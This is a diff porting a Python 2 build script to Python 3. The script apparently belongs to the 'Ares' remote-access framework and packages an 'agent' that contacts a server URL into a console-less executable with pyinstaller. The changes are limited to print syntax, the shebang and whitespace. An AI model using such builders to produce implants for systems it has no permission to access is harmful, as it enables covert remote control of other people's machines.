@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 
 import os
 import shutil
@@ -9,10 +9,10 @@ def build_agent(output, server_url, platform, hello_interval, idle_time, max_fai
     prog_name = os.path.basename(output)
     platform = platform.lower()
     if platform not in ['linux', 'windows']:
-        print "[!] Supported platforms are 'Linux' and 'Windows'"
+        print("[!] Supported platforms are 'Linux' and 'Windows'")
         exit(0)
     if os.name != 'posix' and platform == 'linux':
-        print "[!] Can only build Linux agents on Linux."
+        print("[!] Can only build Linux agents on Linux.")
         exit(0)
     working_dir = os.path.join(tempfile.gettempdir(), 'ares')
     if os.path.exists(working_dir):
@@ -35,7 +35,7 @@ def build_agent(output, server_url, platform, hello_interval, idle_time, max_fai
         os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
         agent_file = os.path.join(working_dir, 'dist', prog_name)
     elif platform == 'windows':
-        if os.name == 'posix': 
+        if os.name == 'posix':
             os.system('wine C:/Python27/Scripts/pyinstaller --noconsole --onefile ' + prog_name + '.py')
         else:
             os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
@@ -45,7 +45,7 @@ def build_agent(output, server_url, platform, hello_interval, idle_time, max_fai
     os.chdir(cwd)
     os.rename(agent_file, output)
     shutil.rmtree(working_dir)
-    print "[+] Agent built successfully: %s" % output
+    print("[+] Agent built successfully: %s" % output)
 
 
 def main():
